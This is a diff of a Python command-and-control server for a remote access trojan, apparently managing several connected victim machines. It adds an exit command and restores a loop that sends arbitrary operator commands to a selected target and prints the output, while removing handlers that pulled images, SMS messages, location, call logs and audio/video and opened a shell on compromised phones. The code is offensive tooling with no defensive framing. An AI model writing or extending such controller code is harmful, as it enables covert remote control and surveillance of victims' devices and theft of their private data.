@@ -87,6 +87,8 @@ def start_turtle():
             conn = get_target(cmd)
             if conn is not None:
                 send_target_commands(conn)
+        elif 'exit' in cmd:   
+            break     
         else:
             print("Command not recognized")
 
@@ -117,7 +119,7 @@ def get_target(cmd):
         target = int(target)
         conn = all_connections[target]
         print("You are now connected to :" + str(all_address[target][0]))
-        #print(str(all_address[target][0]) + ">", end="")
+        print(str(all_address[target][0]) + ">", end="")
         return conn
         # 192.168.0.4> dir
 
@@ -130,41 +132,13 @@ def get_target(cmd):
 def send_target_commands(conn):
     while True:
         try:
-            """ cmd = input()
+            cmd = input()
             if cmd == 'quit':
                 break
             if len(str.encode(cmd)) > 0:
                 conn.send(str.encode(cmd))
                 client_response = str(conn.recv(20480), "utf-8")
-                print(client_response, end="") """
-            msg = conn.recv(4024).decode("UTF-8")
-            if(msg.strip() == "IMAGE"):
-                getImage(conn)
-            elif("readSMS" in msg.strip()):
-                content = msg.strip().split(" ")
-                data = content[1]
-                readSMS(conn,data)
-            elif(msg.strip() == "SHELL"):
-                shell(conn)
-            elif(msg.strip() == "getLocation"):
-                getLocation(conn)
-            elif(msg.strip() == "stopVideo123"):
-                stopVideo(conn)
-            elif(msg.strip() == "stopAudio"):
-                stopAudio(conn)
-            elif(msg.strip() == "callLogs"):
-                callLogs(conn)
-            elif(msg.strip() == "help"):
-                help()
-            else:
-                print(msg)
-            message_to_send = input(Style.BRIGHT+Fore.CYAN+"Interpreter:/> "+Fore.RESET)+"\n"
-            conn.send(message_to_send.encode("UTF-8"))
-            if message_to_send.strip() == "exit":
-                print(" ")
-                print("Bye")
-                sys.exit()
-            if(message_to_send.strip() == "clear"):clear()
+                print(client_response, end="")
         except:
             print("Error sending commands")
             break
